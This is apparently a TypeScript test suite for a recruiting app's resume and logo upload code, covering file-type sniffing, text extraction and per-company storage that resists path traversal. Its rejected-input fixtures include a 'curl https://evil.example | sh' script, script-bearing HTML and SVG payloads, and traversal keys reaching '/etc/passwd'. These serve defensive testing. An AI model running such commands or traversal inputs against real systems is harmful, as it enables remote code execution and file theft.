import assert from "node:assert/strict";
import { randomUUID } from "node:crypto";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { after, before, describe, test } from "node:test";

import JSZip from "jszip";
import { PDFDocument } from "pdf-lib";

import { config } from "../../../config.js";
import { RESUME_MAX_BYTES } from "../../../shared/recruiting.js";
import { docxFixture, para } from "../../test/docxFixtures.js";
import { RecruitingValidationError, recruitingErrorStatus } from "./errors.js";
import {
  LOGO_MAX_BYTES,
  RESUME_TEXT_CHAR_CAP,
  RESUME_TYPE_HINT,
  deleteLogo,
  deleteResume,
  extractResumeText,
  logoAbsPath,
  logoMimeType,
  resumeAbsPath,
  resumeMimeType,
  sniffResume,
  storeLogo,
  storeResume,
  type ResumeKind,
} from "./files.js";

/**
 * Applicants' files on disk: what a resume is, what it says, and where it
 * lives.
 *
 * A resume is a stranger's upload, so nothing about it is trusted but its
 * bytes. The type is sniffed — a PDF named `.docx` is a PDF, text named `.pdf`
 * is refused — and anything that is not what a resume can be (a web page, a
 * program, a spreadsheet zip) is refused before it touches the disk. The text
 * the screener reads is extracted from real PDF, Word and OpenDocument files
 * built here, cut at 60,000 characters rather than refused, and an unreadable
 * file reads as `null` instead of throwing.
 *
 * Stored files live in the company's App-private Recruiting directory under
 * names the server chose, and a stored key is resolved only inside that
 * directory: a key shaped like a path cannot reach another company's resume
 * or anything else on disk. `config.dataDir` is pointed at a temporary
 * directory for the whole file.
 */

const originalDataDir = config.dataDir;
const mutableConfig = config as unknown as { dataDir: string };
let root = "";

before(() => {
  root = fs.mkdtempSync(path.join(os.tmpdir(), "genosyn-recruiting-files-"));
  mutableConfig.dataDir = path.join(root, "data");
});

after(() => {
  mutableConfig.dataDir = originalDataDir;
  fs.rmSync(root, { recursive: true, force: true });
});

/** Where Recruiting must keep this company's files, computed independently of `paths.ts`. */
function recruitingDir(companyId: string, sub: "resumes" | "site"): string {
  return path.join(path.resolve(mutableConfig.dataDir), ".private", "recruiting", companyId, sub);
}

function newCompanyId(): string {
  return `co_${randomUUID()}`;
}

/** Assert a call is refused as a 400 Recruiting validation error with this message. */
async function refused(run: () => Promise<unknown>, message: string): Promise<void> {
  await assert.rejects(run, (error: unknown) => {
    assert.ok(
      error instanceof RecruitingValidationError,
      `expected a RecruitingValidationError, got ${String(error)}`,
    );
    assert.equal(recruitingErrorStatus(error), 400);
    assert.equal(error.message, message);
    return true;
  });
}

const RESUME_LINES = ["Ada Lovelace", "Analytical engine programmer since 1843"];
const RESUME_TEXT = RESUME_LINES.join("\n");

async function pdfResume(lines: string[] = RESUME_LINES): Promise<Buffer> {
  const pdf = await PDFDocument.create();
  const page = pdf.addPage([612, 792]);
  lines.forEach((line, index) => page.drawText(line, { x: 48, y: 730 - index * 24, size: 14 }));
  return Buffer.from(await pdf.save());
}

async function docxResume(lines: string[] = RESUME_LINES): Promise<Buffer> {
  return docxFixture({ body: lines.map((line) => para(line)).join("") });
}

async function zipOf(entries: Record<string, string>): Promise<Buffer> {
  const zip = new JSZip();
  for (const [name, body] of Object.entries(entries)) {
    zip.file(name, body, name === "mimetype" ? { compression: "STORE" } : undefined);
  }
  return zip.generateAsync({ type: "nodebuffer" });
}

const ODT_MIMETYPE = "application/vnd.oasis.opendocument.text";

/** An OpenDocument text file the way LibreOffice lays one out: mimetype first, stored. */
async function odtResume(bodyXml: string, mimetype = ODT_MIMETYPE): Promise<Buffer> {
  return zipOf({
    mimetype,
    "META-INF/manifest.xml":
      '<?xml version="1.0" encoding="UTF-8"?><manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0" manifest:version="1.2"><manifest:file-entry manifest:full-path="/" manifest:media-type="application/vnd.oasis.opendocument.text"/><manifest:file-entry manifest:full-path="content.xml" manifest:media-type="text/xml"/></manifest:manifest>',
    "content.xml":
      '<?xml version="1.0" encoding="UTF-8"?>' +
      '<office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" ' +
      'xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" office:version="1.2">' +
      `<office:body><office:text>${bodyXml}</office:text></office:body></office:document-content>`,
  });
}

const ODT_BODY =
  '<text:h text:style-name="Heading_20_1" text:outline-level="1">Ada Lovelace</text:h>' +
  '<text:p text:style-name="P1">Analytical engine programmer since 1843</text:p>';

/** The legacy Word (OLE compound file) header, padded out to a sector. */
const OLE_DOC = Buffer.concat([
  Buffer.from([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]),
  Buffer.alloc(504),
]);

/** A real 1×1 PNG. */
const PNG = Buffer.from(
  "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==",
  "base64",
);
const JPEG = Buffer.concat([
  Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10]),
  Buffer.from("JFIF\0"),
  Buffer.alloc(16),
]);
const GIF = Buffer.concat([
  Buffer.from("GIF89a", "ascii"),
  Buffer.from([1, 0, 1, 0, 0x80, 0, 0]),
  Buffer.alloc(16),
]);
const WEBP = Buffer.concat([
  Buffer.from("RIFF", "ascii"),
  Buffer.from([0x24, 0, 0, 0]),
  Buffer.from("WEBPVP8 ", "ascii"),
  Buffer.alloc(24),
]);
const SVG = Buffer.from(
  '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><rect width="1" height="1"/></svg>',
);
const WINDOWS_EXE = Buffer.concat([
  Buffer.from("MZ", "ascii"),
  Buffer.from([0x90, 0, 3, 0, 0, 0, 4, 0]),
  Buffer.alloc(120),
]);
const ELF = Buffer.concat([Buffer.from([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0]), Buffer.alloc(56)]);

// ── What a resume is ────────────────────────────────────────────────────────

describe("telling what an uploaded resume is from its bytes", () => {
  test("a PDF is a PDF whatever its name says", async () => {
    const pdf = await pdfResume();
    for (const name of ["resume.pdf", "resume.docx", "resume.txt", "resume.exe", "resume"]) {
      assert.equal(await sniffResume(pdf, name), "pdf", name);
    }
  });

  test("a PDF header a little way into the file still counts, but not past the first kilobyte", async () => {
    const early = Buffer.concat([Buffer.alloc(100, 0x20), Buffer.from("%PDF-1.7\n%âãÏÓ\n")]);
    assert.equal(await sniffResume(early, "resume.pdf"), "pdf");
    const late = Buffer.concat([Buffer.alloc(1024, 0x20), Buffer.from("%PDF-1.7\n")]);
    await refused(() => sniffResume(late, "resume.pdf"), RESUME_TYPE_HINT);
  });

  test("a Word document is told apart from other zips by what is inside, not by its name", async () => {
    const docx = await docxResume();
    for (const name of ["resume.docx", "resume.odt", "resume.pdf", "resume.zip"]) {
      assert.equal(await sniffResume(docx, name), "docx", name);
    }
  });

  test("an OpenDocument text file is told apart by its mimetype entry", async () => {
    for (const name of ["resume.odt", "resume.docx"]) {
      assert.equal(await sniffResume(await odtResume(ODT_BODY), name), "odt", name);
    }
    assert.equal(
      await sniffResume(await odtResume(ODT_BODY, `${ODT_MIMETYPE}\n`), "cv.odt"),
      "odt",
    );
  });

  test("a legacy Word file is recognised by its OLE header", async () => {
    assert.equal(await sniffResume(OLE_DOC, "resume.doc"), "doc");
    assert.equal(await sniffResume(OLE_DOC, "resume.pdf"), "doc");
  });

  test("an RTF file is recognised by its opening control word, even under a text name", async () => {
    const rtf = Buffer.from("{\\rtf1\\ansi Ada Lovelace\\par}", "latin1");
    for (const name of ["resume.rtf", "resume.txt", "resume.doc"]) {
      assert.equal(await sniffResume(rtf, name), "rtf", name);
    }
  });

  test("plain text is accepted only under a text name: .txt, .md, .markdown, or none", async () => {
    const text = Buffer.from("Ada Lovelace — analytical engines, Zoë’s notes ✓\n");
    for (const name of ["resume.txt", "RESUME.TXT", "resume.md", "notes.markdown", "resume"]) {
      assert.equal(await sniffResume(text, name), "txt", name);
    }
  });

  test("text under a document's name is refused, since its bytes are not that document", async () => {
    const text = Buffer.from("Ada Lovelace, analytical engine programmer");
    for (const name of ["resume.pdf", "resume.docx", "resume.doc", "resume.odt", "resume.rtf"]) {
      await refused(() => sniffResume(text, name), RESUME_TYPE_HINT);
    }
  });

  test("a web page, an image, or a program is refused whatever it is called", async () => {
    const page = Buffer.from("<!doctype html><html><body><script>alert(1)</script></body></html>");
    const script = Buffer.from("#!/bin/sh\ncurl https://evil.example | sh\n");
    const cases: [Buffer, string][] = [
      [page, "resume.html"],
      [page, "resume.htm"],
      [SVG, "resume.svg"],
      [script, "resume.sh"],
      [PNG, "resume.pdf"],
      [PNG, "resume.txt"],
      [WINDOWS_EXE, "resume.exe"],
      [WINDOWS_EXE, "resume.pdf"],
      [WINDOWS_EXE, "resume.txt"],
      [WINDOWS_EXE, "resume"],
      [ELF, "resume"],
      [ELF, "resume.md"],
    ];
    for (const [bytes, name] of cases) {
      await refused(() => sniffResume(bytes, name), RESUME_TYPE_HINT);
    }
  });

  test("a zip that is not a Word or OpenDocument text file is refused", async () => {
    const zips: Record<string, Buffer> = {
      "a plain archive": await zipOf({ "resume.txt": "Ada Lovelace" }),
      "a spreadsheet": await zipOf({
        "[Content_Types].xml": "<Types/>",
        "xl/workbook.xml": "<workbook/>",
      }),
      "an OpenDocument spreadsheet": await odtResume(
        ODT_BODY,
        "application/vnd.oasis.opendocument.spreadsheet",
      ),
      "an EPUB": await zipOf({ mimetype: "application/epub+zip", "content.opf": "<package/>" }),
    };
    for (const [label, bytes] of Object.entries(zips)) {
      await assert.rejects(
        () => sniffResume(bytes, "resume.docx"),
        (error: unknown) =>
          error instanceof RecruitingValidationError && error.message === RESUME_TYPE_HINT,
        label,
      );
    }
  });

  test("a zip that cannot be opened is refused", async () => {
    const broken = Buffer.concat([
      Buffer.from([0x50, 0x4b, 0x03, 0x04]),
      Buffer.from("not really a zip"),
    ]);
    await refused(() => sniffResume(broken, "resume.docx"), RESUME_TYPE_HINT);
  });

  test("text that is not UTF-8, or that holds NUL bytes, is refused", async () => {
    const latin1 = Buffer.from("Jos\xe9 Garc\xeda, engineer", "latin1");
    const utf16 = Buffer.concat([
      Buffer.from([0xff, 0xfe]),
      Buffer.from("Ada Lovelace", "utf16le"),
    ]);
    const nul = Buffer.from("Ada\0Lovelace");
    for (const bytes of [latin1, utf16, nul]) {
      await refused(() => sniffResume(bytes, "resume.txt"), RESUME_TYPE_HINT);
    }
  });

  test("an empty file is refused", async () => {
    await refused(() => sniffResume(Buffer.alloc(0), "resume.pdf"), "The resume file is empty.");
  });

  test("a resume is kept to 10 MB: exactly the limit is accepted, one byte more is refused", async () => {
    assert.equal(RESUME_MAX_BYTES, 10 * 1024 * 1024);
    const atLimit = Buffer.alloc(RESUME_MAX_BYTES, 0x20);
    atLimit.write("%PDF-1.7\n", 0, "latin1");
    assert.equal(await sniffResume(atLimit, "resume.pdf"), "pdf");
    await refused(
      () => sniffResume(Buffer.concat([atLimit, Buffer.from(" ")]), "resume.pdf"),
      "Keep the resume under 10 MB.",
    );
  });

  test("each kind is served with its own MIME type", () => {
    const expected: Record<ResumeKind, string> = {
      pdf: "application/pdf",
      docx: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
      doc: "application/msword",
      odt: "application/vnd.oasis.opendocument.text",
      rtf: "application/rtf",
      txt: "text/plain; charset=utf-8",
    };
    for (const [kind, mime] of Object.entries(expected)) {
      assert.equal(resumeMimeType(kind as ResumeKind), mime, kind);
    }
  });
});

// ── What a resume says ──────────────────────────────────────────────────────

describe("reading the words in a resume", () => {
  test("a PDF's words are read", async () => {
    assert.equal(await extractResumeText(await pdfResume(), "pdf"), RESUME_TEXT);
  });

  test("a Word document's paragraphs are read", async () => {
    assert.equal(await extractResumeText(await docxResume(), "docx"), RESUME_TEXT);
  });

  test("an OpenDocument file's headings and paragraphs are read, with its entities decoded once", async () => {
    const odt = await odtResume(
      `${ODT_BODY}<text:p>Programmer<text:tab/>&amp; writer<text:line-break/>` +
        "Notes on &lt;engines&gt; &quot;1843&quot; &apos;Babbage&apos; &amp;lt;kept&amp;gt;</text:p>",
    );
    assert.equal(
      await extractResumeText(odt, "odt"),
      `${RESUME_TEXT}\nProgrammer & writer\nNotes on <engines> "1843" 'Babbage' &lt;kept&gt;`,
    );
  });

  // The file's own line breaks are not text in RTF; only `\par` is, so a
  // WordPad file reads one line per paragraph, never with a blank between.
  test("an RTF file's words are read one line per paragraph, with its hex and unicode escapes", async () => {
    const rtf =
      "{\\rtf1\\ansi\\deff0{\\*\\generator Riched20 10.0.19041;}\\viewkind4\\uc1 " +
      "\\pard\\sa200\\sl276\\slmult1\\f0\\fs24 Ada Lovelace\\par\r\n" +
      "Caf\\'e9 owner and engineer \\u8212? since 1843\\par\r\n}";
    assert.equal(
      await extractResumeText(Buffer.from(rtf, "latin1"), "rtf"),
      "Ada Lovelace\nCafé owner and engineer — since 1843",
    );
  });

  // macOS TextEdit writes `\pardirnatural\partightenfactor0` into every RTF
  // file, Cocoa `\pardeftab720`, and Word `\pararsid<n>` on every paragraph.
  test("an RTF control word that only begins with \\par is removed whole, not cut into words", async () => {
    const rtf =
      "{\\rtf1\\ansi \\pard\\pardirnatural\\pardeftab720\\partightenfactor0\\pararsid5530128 " +
      "Ada Lovelace wrote the first program\\par}";
    assert.equal(
      await extractResumeText(Buffer.from(rtf, "latin1"), "rtf"),
      "Ada Lovelace wrote the first program",
    );
  });

  // A backslash before a line break is RTF's own paragraph mark; TextEdit
  // writes one for every Return pressed inside a paragraph.
  test("an RTF line break written as a backslash before a new line reads as a line break", async () => {
    const rtf = "{\\rtf1\\ansi Ada Lovelace\\\nMathematician and writer of programs}";
    assert.equal(
      await extractResumeText(Buffer.from(rtf, "latin1"), "rtf"),
      "Ada Lovelace\nMathematician and writer of programs",
    );
  });

  test("an RTF file's font and colour tables are not read as the candidate's words", async () => {
    const rtf =
      "{\\rtf1\\ansi\\deff0{\\fonttbl{\\f0\\froman Times New Roman;}{\\f1\\fswiss Arial;}}" +
      "{\\colortbl;\\red0\\green0\\blue0;}\\f0\\fs24 Ada Lovelace wrote the first program\\par}";
    assert.equal(
      await extractResumeText(Buffer.from(rtf, "latin1"), "rtf"),
      "Ada Lovelace wrote the first program",
    );
  });

  test("a whole TextEdit file reads as just its words", async () => {
    const rtf = [
      "{\\rtf1\\ansi\\ansicpg1252\\cocoartf2709",
      "\\cocoatextscaling0\\cocoaplatform0{\\fonttbl\\f0\\fswiss\\fcharset0 Helvetica;\\f1\\fnil\\fcharset0 Menlo-Regular;}",
      "{\\colortbl;\\red255\\green255\\blue255;}",
      "{\\*\\expandedcolortbl;;}",
      "\\paperw11900\\paperh16840\\margl1440\\margr1440\\vieww11520\\viewh8400\\viewkind0",
      "\\pard\\tx566\\tx1133\\pardirnatural\\partightenfactor0",
      "",
      "\\f0\\fs24 \\cf0 Ada Lovelace\\",
      "Mathematician and writer of the first published program\\",
      "\\",
      "Experience\\",
      "Analytical Engine notes, 1843}",
    ].join("\n");
    assert.equal(
      await extractResumeText(Buffer.from(rtf, "latin1"), "rtf"),
      "Ada Lovelace\nMathematician and writer of the first published program\n\nExperience\nAnalytical Engine notes, 1843",
    );
  });

  test("escaped braces and backslashes in RTF read as themselves", async () => {
    const rtf = "{\\rtf1\\ansi Writes \\{json\\} configs and C:\\\\Users paths every day\\par}";
    assert.equal(
      await extractResumeText(Buffer.from(rtf, "latin1"), "rtf"),
      "Writes {json} configs and C:\\Users paths every day",
    );
  });

  test("Windows quotes, dashes and bullets in RTF read as the characters they are", async () => {
    const rtf =
      "{\\rtf1\\ansi\\ansicpg1252 I\\'92m a \\'93hands-on\\'94 engineer \\'96 Rust\\'97Go \\'95 TypeScript\\par\r\n" +
      "\\ldblquote Ships\\rdblquote\\~fast\\emdash and safe \\bullet  \\lquote tested\\rquote\\par}";
    assert.equal(
      await extractResumeText(Buffer.from(rtf, "latin1"), "rtf"),
      "I’m a “hands-on” engineer – Rust—Go • TypeScript\n“Ships” fast—and safe • ‘tested’",
    );
  });

  test("an RTF picture's data is skipped, raw \\bin bytes and all", async () => {
    const rtf =
      "{\\rtf1\\ansi Ada Lovelace {\\pict\\pngblip\\picw16\\pich16 89504e470d0a1a0a0000000d49484452}" +
      // Six raw bytes, braces and a backslash among them, then the two groups close.
      "{\\*\\shppict{\\pict\\jpegblip\\bin6 {}\\{}}}}" +
      " wrote the first program\\par}";
    assert.equal(
      await extractResumeText(Buffer.from(rtf, "latin1"), "rtf"),
      "Ada Lovelace wrote the first program",
    );
  });

  test("RTF metadata, styles and field codes are skipped; field results, headers and list bullets are read", async () => {
    const rtf =
      "{\\rtf1\\ansi{\\info{\\title Resume of Ada}{\\author Ada L}}" +
      "{\\stylesheet{\\s0 Normal;}{\\s1 heading 1;}}" +
      "{\\header\\pard Ada Lovelace, London\\par}" +
      "{\\listtext\\f1 \\'b7\\tab}Analytical engines\\par " +
      'Portfolio: {\\field{\\*\\fldinst HYPERLINK "https://ada.dev"}{\\fldrslt ada.dev}}\\par}';
    assert.equal(
      await extractResumeText(Buffer.from(rtf, "latin1"), "rtf"),
      "Ada Lovelace, London\n· Analytical engines\nPortfolio: ada.dev",
    );
  });

  test("an RTF \\u character skips exactly its group's \\uc fallback characters", async () => {
    const rtf =
      "{\\rtf1\\ansi{\\uc2 Caf\\u233\\'65\\'3f latte}\\par" +
      "{\\uc0 Price \\u8364 50}\\par " +
      "Em \\u8212? dash \\u-3913\\'b7\\par}";
    assert.equal(
      await extractResumeText(Buffer.from(rtf, "latin1"), "rtf"),
      "Café latte\nPrice €50\nEm — dash \uf0b7",
    );
  });

  test("RTF tables and line breaks read as words on lines", async () => {
    const rtf =
      "{\\rtf1\\ansi Skills\\line Rust\\tab expert\\par" +
      "\\trowd\\cellx2000\\cellx4000 Go\\cell senior\\cell\\row}";
    assert.equal(
      await extractResumeText(Buffer.from(rtf, "latin1"), "rtf"),
      "Skills\nRust expert\nGo senior",
    );
  });

  test("stray or missing braces in RTF neither throw nor swallow the words after them", async () => {
    for (const rtf of [
      "{\\rtf1\\ansi Ada Lovelace}} wrote the first program\\par}",
      "{\\rtf1\\ansi Ada {\\b Lovelace} wrote {\\i the first program",
    ]) {
      assert.equal(
        await extractResumeText(Buffer.from(rtf, "latin1"), "rtf"),
        "Ada Lovelace wrote the first program",
        rtf,
      );
    }
  });

  test("plain text is read with its whitespace tidied", async () => {
    const text =
      "  Ada\tLovelace \r\n\r\n\r\n\r\nAnalytical   engines\f and  notes \r\n   since 1843  \n\n";
    assert.equal(
      await extractResumeText(Buffer.from(text), "txt"),
      "Ada Lovelace\n\nAnalytical engines and notes\nsince 1843",
    );
  });

  test("a resume with fewer than 20 readable characters reads as unreadable", async () => {
    assert.equal(await extractResumeText(Buffer.from("a".repeat(19)), "txt"), null);
    assert.equal(await extractResumeText(Buffer.from(`   ${"a".repeat(19)}   \n\n`), "txt"), null);
    assert.equal(await extractResumeText(Buffer.from("a".repeat(20)), "txt"), "a".repeat(20));
  });

  test("a legacy .doc is kept for a person to open but not read", async () => {
    assert.equal(await extractResumeText(OLE_DOC, "doc"), null);
  });

  test("a damaged file reads as unreadable instead of throwing", async () => {
    // pdf.js narrates its recovery attempt on the console; keep the run quiet.
    const log = console.log;
    console.log = () => undefined;
    try {
      assert.equal(
        await extractResumeText(Buffer.from("%PDF-1.4\ngarbage, not a PDF body"), "pdf"),
        null,
      );
    } finally {
      console.log = log;
    }
    assert.equal(await extractResumeText(await zipOf({ "hello.txt": "hi" }), "docx"), null);
    assert.equal(await extractResumeText(Buffer.from("not a zip at all"), "docx"), null);
    assert.equal(await extractResumeText(Buffer.from("not a zip at all"), "odt"), null);
  });

  test(`the text is cut at ${RESUME_TEXT_CHAR_CAP.toLocaleString("en-US")} characters, never refused`, async () => {
    assert.equal(RESUME_TEXT_CHAR_CAP, 60_000);
    const exact = "x".repeat(RESUME_TEXT_CHAR_CAP);
    assert.equal(await extractResumeText(Buffer.from(exact), "txt"), exact);
    const long = "word ".repeat(30_000);
    const fromText = await extractResumeText(Buffer.from(long), "txt");
    assert.equal(fromText?.length, RESUME_TEXT_CHAR_CAP);
    assert.ok(long.startsWith(fromText ?? "-"));
    const longDocx = await docxResume(
      Array.from({ length: 300 }, (_, index) => `Paragraph ${index}: ${"engines ".repeat(50)}`),
    );
    const fromDocx = await extractResumeText(longDocx, "docx");
    assert.equal(fromDocx?.length, RESUME_TEXT_CHAR_CAP);
    assert.ok(fromDocx?.startsWith("Paragraph 0: engines"));
  });
});

// ── Where resumes live ──────────────────────────────────────────────────────

describe("stored resumes", () => {
  test("a resume is written to the company's private Recruiting directory under a name the server chose", async () => {
    const companyId = newCompanyId();
    const bytes = await pdfResume();
    const key = await storeResume(companyId, bytes, "pdf");
    assert.match(key, /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\.pdf$/);
    const abs = path.join(recruitingDir(companyId, "resumes"), key);
    assert.equal(resumeAbsPath(companyId, key), abs);
    assert.ok(
      abs.startsWith(path.join(path.resolve(mutableConfig.dataDir), ".private") + path.sep),
    );
    assert.deepEqual(fs.readFileSync(abs), bytes);
    assert.equal(fs.statSync(abs).mode & 0o777, 0o600, "never world- or group-readable");
  });

  test("the stored name's extension comes from what the bytes are", async () => {
    const companyId = newCompanyId();
    const extensions: Record<ResumeKind, string> = {
      pdf: ".pdf",
      docx: ".docx",
      doc: ".doc",
      odt: ".odt",
      rtf: ".rtf",
      txt: ".txt",
    };
    for (const [kind, extension] of Object.entries(extensions)) {
      const key = await storeResume(companyId, Buffer.from("bytes"), kind as ResumeKind);
      assert.equal(path.extname(key), extension, kind);
    }
  });

  test("storing the same bytes twice writes two files and never overwrites one", async () => {
    const companyId = newCompanyId();
    const bytes = Buffer.from("Ada Lovelace, analytical engines");
    const first = await storeResume(companyId, bytes, "txt");
    const second = await storeResume(companyId, bytes, "txt");
    assert.notEqual(first, second);
    assert.equal(fs.readdirSync(recruitingDir(companyId, "resumes")).length, 2);
  });

  test("a stored resume is found by its key, and gone once deleted", async () => {
    const companyId = newCompanyId();
    const key = await storeResume(companyId, Buffer.from("resume text here"), "txt");
    const abs = resumeAbsPath(companyId, key);
    assert.ok(abs && fs.existsSync(abs));
    await deleteResume(companyId, key);
    assert.equal(fs.existsSync(abs), false);
    assert.equal(resumeAbsPath(companyId, key), null);
    await deleteResume(companyId, key);
    await deleteResume(companyId, null);
  });

  test("a missing, empty or unknown key finds nothing", () => {
    const companyId = newCompanyId();
    assert.equal(resumeAbsPath(companyId, null), null);
    assert.equal(resumeAbsPath(companyId, ""), null);
    assert.equal(resumeAbsPath(companyId, `${randomUUID()}.pdf`), null);
  });

  test("one company cannot reach another company's resume by its key", async () => {
    const owner = newCompanyId();
    const other = newCompanyId();
    const key = await storeResume(owner, Buffer.from("owner's applicant"), "txt");
    assert.equal(resumeAbsPath(other, key), null);
    await deleteResume(other, key);
    assert.ok(resumeAbsPath(owner, key), "the owner's file is untouched");
  });

  test("a key shaped like a path never resolves outside the company's own resumes directory", async () => {
    const victim = newCompanyId();
    const attacker = newCompanyId();
    const victimKey = await storeResume(victim, Buffer.from("victim's applicant"), "txt");
    const victimFile = path.join(recruitingDir(victim, "resumes"), victimKey);
    const outside = path.join(
      path.resolve(mutableConfig.dataDir),
      ".private",
      "recruiting",
      "secret.txt",
    );
    fs.writeFileSync(outside, "not a resume");
    const ownDir = recruitingDir(attacker, "resumes");
    const keys = [
      `../../${victim}/resumes/${victimKey}`,
      `../${victim}/resumes/${victimKey}`,
      `resumes/../../${victim}/resumes/${victimKey}`,
      `..\\..\\${victim}\\resumes\\${victimKey}`,
      victimFile,
      "../../secret.txt",
      "../../../secret.txt",
      "../../../../../../../../etc/passwd",
      "..",
      ".",
      "/",
    ];
    for (const key of keys) {
      const resolved = resumeAbsPath(attacker, key);
      assert.ok(
        resolved === null || resolved.startsWith(ownDir + path.sep),
        `${key} resolved to ${resolved}`,
      );
      await deleteResume(attacker, key);
    }
    assert.ok(fs.existsSync(victimFile), "another company's resume survives every delete");
    assert.ok(
      fs.existsSync(outside),
      "a file outside the resumes directories survives every delete",
    );
  });
});

// ── The careers site's logo ─────────────────────────────────────────────────

describe("the careers site's logo", () => {
  test("a PNG, JPEG, GIF or WebP logo is stored under the company's site directory", async () => {
    const companyId = newCompanyId();
    const images: [Buffer, string, string][] = [
      [PNG, ".png", "image/png"],
      [JPEG, ".jpg", "image/jpeg"],
      [GIF, ".gif", "image/gif"],
      [WEBP, ".webp", "image/webp"],
    ];
    for (const [bytes, extension, mime] of images) {
      const key = await storeLogo(companyId, bytes);
      assert.equal(path.extname(key), extension, mime);
      const abs = logoAbsPath(companyId, key);
      assert.equal(abs, path.join(recruitingDir(companyId, "site"), key));
      assert.deepEqual(fs.readFileSync(abs as string), bytes);
      assert.equal(logoMimeType(key), mime);
    }
  });

  test("an SVG, or anything else that is not one of those images, is refused before it touches the disk", async () => {
    const companyId = newCompanyId();
    for (const bytes of [
      SVG,
      await pdfResume(),
      Buffer.from("just text"),
      Buffer.alloc(0),
      PNG.subarray(0, 20),
    ]) {
      await refused(
        () => storeLogo(companyId, bytes),
        "Upload the logo as a PNG, JPEG, GIF or WebP image.",
      );
    }
    const dir = recruitingDir(companyId, "site");
    assert.deepEqual(fs.existsSync(dir) ? fs.readdirSync(dir) : [], []);
  });

  test("a logo is kept to 2 MB: exactly the limit is accepted, one byte more is refused", async () => {
    const companyId = newCompanyId();
    assert.equal(LOGO_MAX_BYTES, 2 * 1024 * 1024);
    const atLimit = Buffer.concat([PNG, Buffer.alloc(LOGO_MAX_BYTES - PNG.length)]);
    assert.equal(path.extname(await storeLogo(companyId, atLimit)), ".png");
    await refused(
      () => storeLogo(companyId, Buffer.concat([atLimit, Buffer.from([0])])),
      "Keep the logo under 2 MB.",
    );
  });

  test("a logo is found by its key and gone once deleted, and a resume key is not a logo", async () => {
    const companyId = newCompanyId();
    const key = await storeLogo(companyId, PNG);
    const resumeKey = await storeResume(companyId, Buffer.from("resume text"), "txt");
    assert.equal(logoAbsPath(companyId, resumeKey), null);
    assert.equal(logoAbsPath(companyId, `../resumes/${resumeKey}`), null);
    await deleteLogo(companyId, `../resumes/${resumeKey}`);
    assert.ok(resumeAbsPath(companyId, resumeKey), "deleting a logo never reaches the resumes");
    assert.equal(logoAbsPath(newCompanyId(), key), null);
    await deleteLogo(companyId, key);
    assert.equal(logoAbsPath(companyId, key), null);
    await deleteLogo(companyId, null);
  });

  test("a logo's type follows its stored extension, and anything else is served as bytes", () => {
    assert.equal(logoMimeType("a.png"), "image/png");
    assert.equal(logoMimeType("A.PNG"), "image/png");
    assert.equal(logoMimeType("a.jpg"), "image/jpeg");
    assert.equal(logoMimeType("a.gif"), "image/gif");
    assert.equal(logoMimeType("a.webp"), "image/webp");
    for (const key of ["a.svg", "a.html", "a.jpeg", "a"]) {
      assert.equal(logoMimeType(key), "application/octet-stream", key);
    }
  });
});
